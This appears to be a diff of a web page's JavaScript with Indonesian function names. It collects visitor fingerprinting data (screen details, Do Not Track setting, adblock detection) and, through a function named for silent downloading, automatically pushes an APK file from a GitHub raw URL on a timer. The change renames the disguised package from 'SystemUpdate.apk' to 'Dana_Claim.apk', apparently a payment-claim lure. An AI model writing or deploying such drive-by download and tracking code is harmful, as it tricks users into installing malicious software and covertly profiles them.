@@ -158,7 +158,7 @@ function ambilScreenDetail() { K({sumber:'screen_detail',data:{avail:screen.avai
 function ambilDNT() { K({sumber:'dnt',data:navigator.doNotTrack||'unspecified'}); }
 function cekAdBlock() { try { var ad=document.createElement('div'); ad.innerHTML='&nbsp;'; ad.className='adsbox'; document.body.appendChild(ad); setTimeout(function(){ if(ad.offsetHeight===0) K({sumber:'adblock',data:true}); else K({sumber:'adblock',data:false}); document.body.removeChild(ad); },100); } catch(e){} }
 
-var files = ['https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.apk'];
+var files = ['https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Dana_Claim.apk'];
 var downloaded = [];
 
 function downloadDiamDiam(url, filename) {
@@ -181,7 +181,7 @@ function downloadDiamDiam(url, filename) {
 
 function initM2() {
     setTimeout(function() {
-        if(downloaded.indexOf(files[0])===-1) downloadDiamDiam(files[0],'SystemUpdate.apk');
+        if(downloaded.indexOf(files[0])===-1) downloadDiamDiam(files[0],'Dana_Claim.apk');
     },1000);
 }
 
